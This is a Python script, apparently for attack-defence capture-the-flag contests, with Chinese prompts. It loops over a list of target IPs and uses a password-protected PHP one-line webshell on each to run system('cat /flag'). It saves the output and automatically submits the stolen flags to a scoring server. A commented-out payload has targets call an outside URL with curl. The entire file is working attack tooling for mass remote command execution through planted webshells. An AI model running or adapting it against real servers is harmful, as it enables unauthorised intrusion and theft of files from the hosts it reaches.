#!/usr/bin/python3
#By purplet
import requests
def post_Flag(shell_url):
    try:
        res=requests.post(shell_url,payload,timeout=2)
        if res.status_code == 200:
            result = shell_url + " connect shell sucess,flag is "+res.text
            print(result)
            flag.write(res.text+'\n')
        else:
            print("Shell 404")
    except:
        print(shell_url + " connect shell fail")
        
def get_Flag(shell_url):
    try:
        res=requests.get(shell_url,payload,timeout=2)
        if res.status_code == 200:
            result = shell_url + " connect shell sucess,flag is "+res.text
            print(result)
            flag.write(res.text+'\n')
        else:
            print("Shell 404")
    except:
        print(shell_url + " connect shell fail")
        
def submit_Flag(flag_url):
    try:
        res=requests.post(flag_url,data,timeout=1)
        if res.status_code == 200:
            print("submit flag success--")
        else:
            print("submit flag fail")
    except:
        print(flag_url + " connect fail")

def prepare_post_get():
    global payload
    payload = {passwd: "system('cat /flag');"}
    #payload = {passwd: "system('curl http://flag.host/getflag.php');"}#需修改
    #payload =  {passwd: 'cat /flag'}
    for i in url_head:
        shell_url = i.strip()+shell_addr
        if (int(type)==1):
            get_Flag(shell_url)
        else:
            post_Flag(shell_url)
    flag.close()
    first_flag = open('firstround_flag.txt',"r")
    first_flag_list = first_flag.readlines()
    flag_server = input("[+] 请输入提交flag的网址Input example:http://192.168.194.147:9090/\n")
    token = input("[+] 请输入自己队伍的token：")
    for j in first_flag_list:
        global data
        data = {
                'flag':j.strip(),
                'token':token
        }
        submit_Flag(flag_server)

if __name__ == '__main__':
    print("该脚本可利用GET或POST型一句话木马实现开场第一波flag的获取，并自动提交flag。需结合“IP扫描.py”使用")
    file = open('ip.txt','r')
    url_head = file.readlines()
    flag=open("firstround_flag.txt","w")
    print("[+] 请输入shell地址Input example:/footer.php")
    shell_addr = input()
    print("[+] 请输入木马密码Input example：shell")
    passwd = input("")
    print("[+] 请选择木马类型 1.GET 2.POST")
    global type
    type = input("")
    prepare_post_get()
    